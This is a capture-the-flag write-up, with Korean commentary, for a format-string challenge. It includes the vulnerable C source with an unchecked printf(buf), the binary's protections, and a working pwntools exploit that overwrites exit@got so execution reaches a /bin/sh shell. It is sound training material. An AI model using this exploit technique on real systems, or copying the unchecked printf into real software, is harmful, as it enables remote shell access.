## basic_exploitation_002
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```

<br>

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

<br><br>

## Solution
---

가볍게 exit@got를 overwrite 해주면 된다.

왜냐하면 PIE가 적용되어 있지 않고, RELRO 또한 FULL이 아닌 Partial이기 때문에 가능하다.

코드 상에서 read로 받아오고 0x80만큼 받아오게 되는데 우리가 입력하는 값은 어차피 문자열이기 때문에 buf 안에 값은 정상적으로 다 들어간다.

처음엔 셸이 안되서 착각했었던 부분이었는데 그냥 실수였음.

그래서 포맷스트링을 넣어주면 첫 번째 포맷인자에서 포맷스트링을 받아오므로 exit의 got 주소의 하위 2바이트 값만 get_shell과 맞춰주면 된다.

둘의 주소가 비슷해서 가능.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',9047)

# context.log_level = 'debug'

# get_shell = 0x0804 8609

e = ELF('./basic_exploitation_002')

exit_got = e.got['exit'] # 0x0804 8476 -> 84 76 -> 86 09

payload = p32(exit_got) + p32(exit_got+1) + b'%1c%1$hhn%125c%2$hhn'

p.send(payload)
p.interactive()
```
